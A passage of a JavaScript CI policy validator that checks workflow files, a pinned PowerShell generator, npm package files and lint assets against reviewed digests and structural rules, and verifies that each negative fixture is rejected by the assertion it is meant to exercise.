  "T1-BUILD-163": "side-effect-policy: build.verify helper Invoke-GitRaw does not contain complete single-line comment-based help",
  "T1-BUILD-164": "side-effect-policy: build.verify runs an unreviewed command: ConvertFrom-NulRecords",
  "T1-BUILD-165": "side-effect-policy: build.verify runs an unreviewed command: Assert-AllowedPaths",
  "T1-BUILD-166": "side-effect-policy: build.verify does not bracket the generator with a worktree byte comparison",
  "T1-BUILD-167": "git-policy: build.verify no longer drains both Git streams concurrently",
  "T1-CLI-001": "cli: expected --preflight or exactly two workflow arguments",
  "T1-CLI-002": "cli: expected --preflight or exactly two workflow arguments",
  "T1-CLI-003": "cli: --preflight must be the only argument",
  "T1-CLI-004": "cli: expected --preflight or exactly two workflow arguments",
  "T2-GENERATOR-FILE-001": "supply-policy: the generator does not preserve the reviewed existing-destination publication assertion count",
  "T2-GENERATOR-FILE-002": "supply-policy: the generator does not preserve the reviewed absent-destination publication assertion count",
  "T2-GENERATOR-FILE-003": "supply-policy: the generator does not preserve the reviewed unexpected-destination refusal assertion count",
  "T2-GENERATOR-FILE-004": "supply-policy: the generator does not preserve the reviewed candidate identity capture assertion count",
  "T2-GENERATOR-FILE-005": "supply-policy: the generator does not preserve the reviewed bounded collision handling assertion count",
  "T2-GENERATOR-FILE-006": "supply-policy: the generator does not preserve the reviewed durable candidate flush assertion count",
  "T2-GENERATOR-FILE-007": "supply-policy: the generator does not preserve the reviewed pre-publication destination revalidation assertion count",
  "T2-GENERATOR-FILE-008": "supply-policy: the generator does not preserve the reviewed post-publication verification assertion count",
  "T2-GENERATOR-FILE-009": "supply-policy: the generator does not preserve the reviewed identity-bound cleanup assertion count",
  "T2-GENERATOR-FILE-010": "supply-policy: the generator does not preserve the reviewed ordered artifact records assertion count",
  "T2-GENERATOR-FILE-011": "supply-policy: the generator does not preserve the reviewed BSD platform dispatch assertion count",
  "T2-GENERATOR-FILE-012": "supply-policy: the generator does not preserve the reviewed final candidate identity binding assertion count",
});

function runNegativeFixtures(buildSource, markdownSource, packageSource, lockSource, generatorSource) {
  const ids = new Set();
  const consumed = new Set();
  for (const [id, description, kind, fixture] of FIXTURE_INVENTORY) {
    if (ids.has(id)) reject('fixture-harness', `duplicate fixture ID ${id}`);
    ids.add(id);
    let rejected = false;
    let message = '';
    try {
      if (kind === 'yaml') {
        parseStrictYaml(fixture, id);
      } else if (kind === 'build') {
        const source = fixture(buildSource);
        validateBuildPolicy(parseStrictYaml(source, id), source);
      } else if (kind === 'markdown') {
        const source = fixture(markdownSource);
        validateMarkdownPolicy(parseStrictYaml(source, id), source);
      } else if (kind === 'dependabot') {
        validateDependabotPolicy(parseStrictYaml(fixture, id));
      } else if (kind === 'version') {
        parseGeneratorVersion(fixture, EXPECTED_VERSION);
      } else if (kind === 'unexpected-version') {
        parseGeneratorVersion(fixture, EXPECTED_VERSION);
      } else if (kind === 'text') {
        decodeStrictText(fixture, id);
      } else if (kind === 'package') {
        validatePackagePolicy(...fixture(packageSource, lockSource));
      } else if (kind === 'generator') {
        validateGeneratorPolicy(fixture(generatorSource));
      } else if (kind === 'lint-asset') {
        validateLintAssetPolicy(fixture);
      } else if (kind === 'npm-config') {
        assertNoNpmConfiguration('/repo', '/repo', (directory) => fixture[directory] ?? []);
      } else if (kind === 'parser-tree') {
        assertReviewedParserTree(
          '/yaml',
          (directory) => fixture.directories[directory] ?? [],
          (path) => Buffer.from(fixture.files[path] ?? '', 'utf8'),
        );
      } else if (kind === 'cli') {
        selectCliMode(fixture);
      } else {
        reject('fixture-harness', `unknown fixture kind for ${id}`);
      }
    } catch (error) {
      // A fixture-harness error means the mutation was never built — typically a
      // replaceOnce anchor gone stale after a refactor. Counting that as a
      // rejection would report full coverage for a fixture that tested nothing
      // and let the assertion it guards regress unnoticed, so it propagates.
      if (error instanceof PolicyError && error.category !== 'fixture-harness') {
        rejected = true;
        message = error.message;
      } else throw error;
    }
    if (!rejected) reject('fixture-harness', `${id} (${description}) was not rejected`);
    consumed.add(id);
    // Rejection alone proves nothing about which assertion did the rejecting. A
    // mutation that trips an earlier, broader check -- a key-set assertion, a
    // closing digest, the anchor rule ahead of the merge-key rule -- is counted
    // as coverage for an assertion that never ran, and the count then overstates
    // what the suite defends. Three fixtures were in that state when this was
    // added. Naming the expected rejection makes the claim checkable, and an
    // unlisted fixture is an error rather than a silent pass.
    const expected = FIXTURE_EXPECTATIONS[id];
    if (typeof expected !== 'string') {
      reject('fixture-harness', `${id} (${description}) declares no expected rejection`);
    }
    if (!message.includes(expected)) {
      reject('fixture-harness', `${id} (${description}) was rejected by the wrong assertion: ${message}`);
    }
  }
  // The lookup above only runs for fixtures that exist, so an expectation whose
  // fixture was deleted or renamed is never examined: coverage falls, the count
  // falls with it, and nothing objects -- the inventory's append-only contract
  // is a convention rather than something the harness can see. No fixed count
  // is enforced either, and pinning one would only move the problem, since the
  // number is meant to grow. Requiring the two sets to agree exactly is what
  // makes a lost fixture a failure: every expectation must be consumed, so an
  // orphan is as loud as a fixture with no expectation.
  for (const id of Object.keys(FIXTURE_EXPECTATIONS)) {
    if (!consumed.has(id)) {
      reject('fixture-harness', `expectation ${id} has no fixture; coverage was removed`);
    }
  }
  return ids.size;
}

// Buffer.prototype.toString('utf8') substitutes U+FFFD for malformed input, so
// the validated character stream could differ from the committed bytes that
// GitHub and PowerShell consume, and distinct malformed byte sequences could
// collapse to one policy digest. Decoding fatally keeps bytes and characters
// in exact correspondence.
export function decodeStrictText(bytes, label) {
  if (bytes.subarray(0, 3).equals(Buffer.from([0xef, 0xbb, 0xbf]))) reject('text-policy', `${label} has a UTF-8 BOM`);
  if (bytes.includes(0x0d)) reject('text-policy', `${label} contains a carriage return`);
  let text;
  try {
    text = new TextDecoder('utf-8', { fatal: true, ignoreBOM: true }).decode(bytes);
  } catch {
    reject('text-policy', `${label} is not well-formed UTF-8`);
  }
  if (!Buffer.from(text, 'utf8').equals(bytes)) reject('text-policy', `${label} does not round-trip its committed bytes`);
  return text;
}

function readOrdinaryText(path, label) {
  const stat = lstatSync(path);
  if (!stat.isFile() || stat.isSymbolicLink()) reject('filesystem-policy', `${label} is not an ordinary file`);
  if (realpathSync(path) !== resolve(path)) reject('filesystem-policy', `${label} resolves through an alias`);
  return decodeStrictText(readFileSync(path), label);
}

// Concatenating sources into one hash is ambiguous: moving a trailing byte from
// one file onto the front of the next can leave both files valid and produce an
// identical combined stream, so the digest would not move even though two
// committed inputs changed. Framing each contribution with its label and exact
// byte length makes the boundaries unambiguous.
// npm resolves its project configuration from .npmrc before it runs a command,
// and script-shell there replaces the interpreter for every npm run — so a lint
// script can be echoed to the log, exit zero, and never reach a linter. That
// file is covered by no reviewed digest and named by no governed workflow, which
// makes an absence rule the only form the policy can take. node_modules is not
// tracked and its packages may legitimately carry .npmrc, so it is skipped.
// The directory reader is a parameter so the walk is reachable from the fixture
// harness. Asserting an absence against the live checkout can only ever observe
// the passing case, which is no evidence that the rule fires.
export function assertNoNpmConfiguration(directory, repositoryRoot, readDirectory = readdirSync) {
  for (const entry of readDirectory(directory, { withFileTypes: true })) {
    if (entry.name === '.git' || entry.name === 'node_modules') continue;
    const path = join(directory, entry.name);
    if (entry.isDirectory()) {
      assertNoNpmConfiguration(path, repositoryRoot, readDirectory);
    } else if (entry.name === '.npmrc') {
      reject('supply-policy', `repository-controlled npm configuration is present: ${path.slice(repositoryRoot.length + 1)}`);
    }
  }
}

export function validateLintAssetPolicy(assets) {
  for (const [label, source] of Object.entries(assets)) {
    if (createHash('sha256').update(source, 'utf8').digest('hex') !== REVIEWED_LINT_DIGESTS[label]) {
      reject('supply-policy', `${label} does not match its reviewed digest`);
    }
  }
}

// Version first, then bytes: an intentional edit that forgot the version bump
// should say so, rather than reporting only that a hash moved.
export function validateGeneratorPolicy(source) {
  parseGeneratorVersion(source, EXPECTED_VERSION);
  const rawGeneratorCode = powerShellCodeProjection(source);
  const generatorCode = powerShellTokenView(normalizeLineContinuations(source));
  assertLiteralStaticCalls(generatorCode, 'supply-policy', 'the generator');

  if (/[^\t\n\x20-\x7e]/u.test(source)) {
    reject('supply-policy', 'the generator contains a character outside printable ASCII');
  }
  if (!generatorCode.includes('Microsoft.PowerShell.Core\\Get-Command')) {
    reject('supply-policy', 'the generator does not resolve Git through a module-qualified lookup');
  }
  if (!source.includes("Microsoft.PowerShell.Core\\Get-Command -Name git -CommandType Application -ErrorAction Stop")) {
    reject('supply-policy', 'the generator does not resolve Git through a module-qualified lookup');
  }
  if (/(?<!Microsoft\.PowerShell\.Core\\)Get-Command/iu.test(generatorCode)) {
    reject('supply-policy', 'the generator resolves a command through a shadowable lookup');
  }
  const gitPathAssignments = generatorCode.match(variableWritePattern('strGitPath')) ?? [];
  if (gitPathAssignments.length !== 1) {
    reject('supply-policy', 'the generator does not assign its Git path exactly once');
  }
  if (!/\)\s*\$arrGitCommands = @\(Microsoft\.PowerShell\.Core\\Get-Command/u.test(generatorCode)) {
    reject('supply-policy', 'the generator can reach its Git lookup only after unreviewed statements');
  }
  if (/\$ExecutionContext\s*\.\s*InvokeCommand|\.\s*InvokeCommand\s*\.\s*GetCommand|\[\s*(?:System\.)?Management\.Automation\.CommandTypes\s*\]/iu.test(generatorCode)) {
    reject('supply-policy', 'the generator resolves a command through a session-state lookup API');
  }
  if (/\b(?:Set-Variable|New-Variable|Get-Variable|Clear-Variable|Remove-Variable|Set-Item|New-Item)\b|Variable:|PSVariable/iu.test(generatorCode)) {
    reject('supply-policy', 'the generator writes a variable through an indirect API');
  }

  const arrObservedQualified = [...generatorCode.matchAll(QUALIFIED_ASSIGNMENT)].map((match) => match[1] ?? match[2]);
  const arrRemainingQualified = [...REVIEWED_GENERATOR_QUALIFIED_ASSIGNMENTS];
  for (const target of arrObservedQualified) {
    const index = arrRemainingQualified.indexOf(target);
    if (index < 0) {
      reject('supply-policy', REVIEWED_GENERATOR_QUALIFIED_ASSIGNMENTS.includes(target)
        ? `the generator writes a reviewed qualified variable more than once: ${target}`
        : `the generator writes an unreviewed qualified variable: ${target}`);
    }
    arrRemainingQualified.splice(index, 1);
  }
  if (arrRemainingQualified.length > 0) {
    reject('supply-policy', `the generator no longer writes a reviewed qualified variable: ${arrRemainingQualified[0]}`);
  }

  for (const token of generatorCode.matchAll(GENERATOR_COMMAND_POSITION)) {
    if (!REVIEWED_GENERATOR_COMMANDS.includes(token[1])) {
      reject('supply-policy', `the generator runs an unreviewed command: ${token[1]}`);
    }
  }
  if (DOT_SOURCE.test(generatorCode)) {
    reject('supply-policy', 'the generator uses the dot-source invocation operator');
  }

  const projectedLines = generatorCode.split('\n');
  const rawLines = source.split('\n');
  const observedInvocations = [];
  let lineStart = 0;
  for (let index = 0; index < projectedLines.length; index += 1) {
    const operatorAt = invocationOperatorOffset(projectedLines[index]);
    if (operatorAt >= 0) {
      observedInvocations.push([
        (rawLines[index] ?? '').trim(),
        powerShellBraceDepthAt(generatorCode, lineStart + operatorAt),
      ]);
    }
    lineStart += projectedLines[index].length + 1;
  }
  if (observedInvocations.length !== REVIEWED_GENERATOR_INVOCATIONS.length) {
    reject('supply-policy', 'the generator does not invoke through the call operator exactly where it was reviewed to');
  }
  for (let index = 0; index < REVIEWED_GENERATOR_INVOCATIONS.length; index += 1) {
    const [reviewedLine, reviewedDepth] = REVIEWED_GENERATOR_INVOCATIONS[index];
    const [observedLine, observedDepth] = observedInvocations[index];
    if (observedLine !== reviewedLine) {
      reject('supply-policy', `the generator makes an unreviewed invocation: ${observedLine}`);
    }
    if (observedDepth !== reviewedDepth) {
      reject('supply-policy', `a reviewed invocation is no longer reachable where it was reviewed: ${reviewedLine}`);
    }
  }

  for (const match of generatorCode.matchAll(/\breturn\b/gu)) {
    if (powerShellBraceDepthAt(generatorCode, match.index) === 0) {
      reject('supply-policy', 'the generator returns at the top level');
    }
  }

  const arrExitTokens = [...rawGeneratorCode.matchAll(/\bexit\b/gu)];
  if (arrExitTokens.length !== 1 ||
      powerShellBraceDepthAt(rawGeneratorCode, arrExitTokens[0].index) !== 0 ||
      source.slice(arrExitTokens[0].index, arrExitTokens[0].index + 'exit $intExitCode'.length) !== 'exit $intExitCode') {
    reject('supply-policy', 'the generator can terminate before the reviewed result');
  }

  const requiredFragments = Object.freeze([
    ['result schema', "$script:strGeneratorResultSchema = 'TerraformStyleGuide.GeneratorResult.v2'", 1],
    ['Git executable binding', '$strGitPath = [string]$arrGitCommands[0].Source', 1],
    ['tracked-destination authority', 'Assert-TrackedFile -RepositoryRoot $strRepositoryRoot -RepositoryPath $strRepositoryPath', 1],
    ['native Git status and exact path check', 'if ($intGitExit -ne 0 -or $arrOutput.Count -ne 1 -or $arrOutput[0] -cne $RepositoryPath) {', 1],
    ['fixed destination map', "    'terraform-instructions' = 'terraform.instructions.md'", 1],
    ['complete payload map', '$hashtablePayloads = New-StyleGuidePayloadMap', 1],
    ['ordered artifact records', '$listArtifactRecords.Add((New-ArtifactRecord', 1],
    ['existing-destination publication', '[TerraformStyleGuide.AtomicFileReplacement]::Replace($strTemporaryPath, $strDestinationPath)', 1],
    ['absent-destination publication', '[System.IO.File]::Move($strTemporaryPath, $strDestinationPath)', 1],
    ['unexpected-destination refusal', "throw 'unexpected-destination'", 3],
    ['candidate identity capture', '$strCandidateIdentity = Get-OrdinaryFileIdentity -LiteralPath $strCandidateFullPath', 1],
    ['BSD platform dispatch', 'if ($boolHostIsMacOS -or $boolHostIsFreeBsd) {', 1],
    ['bounded collision handling', "throw 'candidate-collision-limit'", 1],
    ['durable candidate flush', '$objCandidateStream.Flush($true)', 1],
    ['candidate byte verification', "throw 'candidate-byte-mismatch'", 1],
    ['pre-publication destination revalidation', "$strPhase = 'revalidate-publication'", 1],
    ['post-publication verification', "$strPhase = 'verify-publication'", 1],
    ['final candidate identity binding', 'if ($hashtableRecord.FinalOrdinaryIdentity -cne $strCandidateIdentity) {', 1],
    ['post-publication uncertainty', "$hashtableRecord.Status = 'ReplacementStateUncertain'", 3],
    ['identity-bound cleanup', 'if ((Get-OrdinaryFileIdentity -LiteralPath $strTemporaryPath) -cne $strCandidateIdentity) {', 1],
    ['candidate cleanup deletion', '[System.IO.File]::Delete($strTemporaryPath)', 1],
    ['failed pre-publication result', "$hashtableRecord.Status = 'Failed'", 1],
    ['truthful result serialization', 'Write-GeneratorResult -Result $hashtableResult', 2],
    ['in-memory helper state annotation', '[System.Diagnostics.CodeAnalysis.SuppressMessageAttribute(', 6],
  ]);
  for (const [label, fragment, expectedCount] of requiredFragments) {
    const count = source.split(fragment).length - 1;
    if (count !== expectedCount) {
      reject('supply-policy', `the generator does not preserve the reviewed ${label} assertion count`);
    }
  }

  const reviewedOrder = Object.freeze([
    ["$strResultPhase = 'validate-fixed-authority'", 1],
    ["$strResultPhase = 'compute-complete-payloads'", 1],
    ['$hashtablePayloads = New-StyleGuidePayloadMap', 1],
    ["$strResultPhase = 'replace-artifacts'", 1],
    ['foreach ($strArtifactId in $hashtableDestinationMap.Keys) {', 1],
    ['Write-GeneratorResult -Result $hashtableResult', 0],
    ['exit $intExitCode', 0],
  ]);
  let cursor = -1;
  for (const [fragment, expectedDepth] of reviewedOrder) {
    const index = source.indexOf(fragment, cursor + 1);
    if (index <= cursor || source.indexOf(fragment, index + 1) !== -1 ||
        powerShellBraceDepthAt(source, index) !== expectedDepth) {
      reject('supply-policy', `the generator does not preserve the reviewed transaction order: ${fragment}`);
    }
    cursor = index;
  }
  const reviewedTail = 'Write-GeneratorResult -Result $hashtableResult\nexit $intExitCode';
  if (source.trimEnd().slice(source.trimEnd().lastIndexOf('Write-GeneratorResult -Result $hashtableResult')) !== reviewedTail) {
    reject('supply-policy', 'the generator does not terminate immediately after the reviewed result');
  }

  assertPowerShellPrivateHelperHelp(
    source,
    REVIEWED_GENERATOR_HELP,
    EXPECTED_VERSION,
    'supply-policy',
    'the generator',
  );
  if (createHash('sha256').update(source, 'utf8').digest('hex') !== REVIEWED_GENERATOR_DIGEST) {
    reject('supply-policy', 'generator does not match its reviewed digest');
  }
}

function foldPolicyInput(hash, label, source) {
  const bytes = Buffer.from(source, 'utf8');
  hash.update(`${label}:${bytes.length}\n`, 'utf8');
  hash.update(bytes);
}

// Case-insensitive on the hex, because Get-FileHash reports upper case and
// createHash reports lower; length is checked so an empty or truncated value
// cannot pass as a match.
function assertExpectedSourceDigest(source, expected, label) {
  if (expected === undefined || expected === '') return;
  if (!/^[0-9a-f]{64}$/iu.test(expected)) {
    reject('input-policy', `the expected digest supplied for ${label} is not a SHA-256 value`);
  }
  const observed = createHash('sha256').update(source, 'utf8').digest('hex');
  if (observed !== expected.toLowerCase()) {
    reject('input-policy', `${label} changed after the job recorded its digest`);
  }
}

export function validateRepositoryPolicy(buildPath, markdownPath) {
  if (basename(buildPath) !== 'build.yml' || basename(markdownPath) !== 'markdownlint.yml') {
    reject('cli', 'arguments must be build.yml then markdownlint.yml');
  }
  const workflowDirectory = dirname(resolve(buildPath));
  if (dirname(resolve(markdownPath)) !== workflowDirectory) reject('cli', 'workflow arguments must share one directory');
  const workflowFiles = readdirSync(workflowDirectory)
    .filter((name) => /\.ya?ml$/u.test(name))
    .sort();
  assertEqual(workflowFiles, ['build.yml', 'markdownlint.yml'], 'tracked workflow file set');

  const buildSource = readOrdinaryText(resolve(buildPath), 'build.yml');
  const markdownSource = readOrdinaryText(resolve(markdownPath), 'markdownlint.yml');
  // Asserted against the text just read, not against a separate stat of the
  // file. The Markdown job records these digests before npm ci -- before any
  // third-party code in that job has run -- and the validator now executes
  // after both lint phases, so a compromised package in the pinned tree gets
  // the opportunity to rewrite these two files first. Comparing hashes in the
  // workflow immediately before invoking this script would not close that:
  // a writer spawned by a linter can act between such a comparison and the
  // read below. Hashing the parsed text has no interval at all -- a swap
  // before the read fails here, and a swap afterwards cannot reach content
  // already held.
  //
  // Absent variables skip the check so the script stays runnable by hand; the
  // Markdown policy separately requires the step to set both, and the step
  // body is covered by REVIEWED_VALIDATION_STEP_DIGEST.
  assertExpectedSourceDigest(buildSource, process.env.T1_EXPECTED_BUILD_DIGEST, 'build.yml');
  assertExpectedSourceDigest(markdownSource, process.env.T1_EXPECTED_MARKDOWN_DIGEST, 'markdownlint.yml');
  validateBuildPolicy(parseStrictYaml(buildSource, 'build.yml'), buildSource);
  validateMarkdownPolicy(parseStrictYaml(markdownSource, 'markdownlint.yml'), markdownSource);

  const githubDirectory = dirname(workflowDirectory);
  const repositoryRoot = dirname(githubDirectory);
  const dependabotSource = readOrdinaryText(join(githubDirectory, 'dependabot.yml'), 'dependabot.yml');
  validateDependabotPolicy(parseStrictYaml(dependabotSource, 'dependabot.yml'));
  const attributes = readOrdinaryText(join(repositoryRoot, '.gitattributes'), '.gitattributes');
  if (attributes !== '* text=auto eol=lf\n') reject('text-policy', '.gitattributes does not have exact content');
  const generatorSource = readOrdinaryText(join(workflowDirectory, 'Generate-StyleGuideArtifacts.ps1'), 'generator');
  validateGeneratorPolicy(generatorSource);
  const packageSource = readOrdinaryText(join(workflowDirectory, 'package.json'), 'package.json');
  const lockSource = readOrdinaryText(join(workflowDirectory, 'package-lock.json'), 'package-lock.json');
  validatePackagePolicy(packageSource, lockSource);
  assertNoNpmConfiguration(repositoryRoot, repositoryRoot);
  // The digest covered every governed input but not the implementation defining
  // what those inputs were checked against, so removing an assertion here left
  // the reported hash unchanged. Evidence for a policy run has to bind the rules
  // as well as the material.
  const lintAssets = Object.fromEntries(Object.keys(REVIEWED_LINT_DIGESTS).map(
    (name) => [name, readOrdinaryText(join(workflowDirectory, name), name)],
  ));
  validateLintAssetPolicy(lintAssets);
  const validatorSource = readOrdinaryText(join(workflowDirectory, 'Validate-WorkflowPolicy.mjs'), 'validator');

  const fixtureCount = runNegativeFixtures(buildSource, markdownSource, packageSource, lockSource, generatorSource);
  return Object.freeze({
    fixtureCount,
    generatorVersion: EXPECTED_VERSION,
    // Every input this function validates, folded in validation order, so the
    // reported digest is complete evidence for the policy that was checked. The
    // generator matters most here: its bytes can change substantially while its
    // version marker stays fixed, so omitting it left the digest unmoved by a
    // real change to validated content.
    policyDigest: (() => {
      const hash = createHash('sha256');
      for (const [label, source] of [
        ['build.yml', buildSource],
        ['markdownlint.yml', markdownSource],
        ['dependabot.yml', dependabotSource],
        ['.gitattributes', attributes],
        ['generator', generatorSource],
        ['package.json', packageSource],
        ['package-lock.json', lockSource],
        ...Object.entries(lintAssets),
        ['validator', validatorSource],
      ]) {
        foldPolicyInput(hash, label, source);
      }
      return hash.digest('hex');
    })(),
  });
}

// This gate runs before npm ci and therefore uses only Node built-ins. The
// Terraform policy authority is embedded in this validator rather than stored
// in the PS repository's external contract files, so preflight applies the
// existing embedded supply identities without adding a second authority.
export function validatePreflightPolicy() {
  const validatorPath = fileURLToPath(import.meta.url);
  const workflowDirectory = dirname(validatorPath);
  const githubDirectory = dirname(workflowDirectory);
  const repositoryRoot = dirname(githubDirectory);

  const packageSource = readOrdinaryText(join(workflowDirectory, 'package.json'), 'package.json');
  const lockSource = readOrdinaryText(join(workflowDirectory, 'package-lock.json'), 'package-lock.json');
  validatePackagePolicy(packageSource, lockSource);

  const generatorSource = readOrdinaryText(join(workflowDirectory, 'Generate-StyleGuideArtifacts.ps1'), 'generator');
  validateGeneratorPolicy(generatorSource);

  const attributes = readOrdinaryText(join(repositoryRoot, '.gitattributes'), '.gitattributes');
  if (attributes !== '* text=auto eol=lf\n') reject('text-policy', '.gitattributes does not have exact content');

  const lintAssets = Object.fromEntries(Object.keys(REVIEWED_LINT_DIGESTS).map(
    (name) => [name, readOrdinaryText(join(workflowDirectory, name), name)],
  ));
  validateLintAssetPolicy(lintAssets);
  assertNoNpmConfiguration(repositoryRoot, repositoryRoot);

  const validatorSource = readOrdinaryText(validatorPath, 'validator');
  return Object.freeze({
    generatorVersion: EXPECTED_VERSION,
    packageDigest: createHash('sha256').update(packageSource, 'utf8').digest('hex'),
    lockDigest: createHash('sha256').update(lockSource, 'utf8').digest('hex'),
    generatorDigest: createHash('sha256').update(generatorSource, 'utf8').digest('hex'),
    validatorDigest: createHash('sha256').update(validatorSource, 'utf8').digest('hex'),
  });
}

function main(argv) {
  const mode = selectCliMode(argv);
  if (mode === 'preflight') {
    const result = validatePreflightPolicy();
    process.stdout.write(`workflow-policy-preflight: pass; version=${result.generatorVersion}; package=${result.packageDigest}; lock=${result.lockDigest}; generator=${result.generatorDigest}; validator=${result.validatorDigest}\n`);
    return;
  }
  const result = validateRepositoryPolicy(argv[0], argv[1]);
  process.stdout.write(`workflow-policy: pass; fixtures=${result.fixtureCount}; version=${result.generatorVersion}; digest=${result.policyDigest}\n`);
}

if (import.meta.url === pathToFileURL(resolve(process.argv[1])).href) {
  try {
    main(process.argv.slice(2));
  } catch (error) {
    if (error instanceof PolicyError) {
      process.stderr.write(`${error.message}\n`);
      process.exitCode = 1;
    } else {
      process.stderr.write('workflow-policy: unexpected validator failure\n');
      process.exitCode = 1;
    }
  }
}
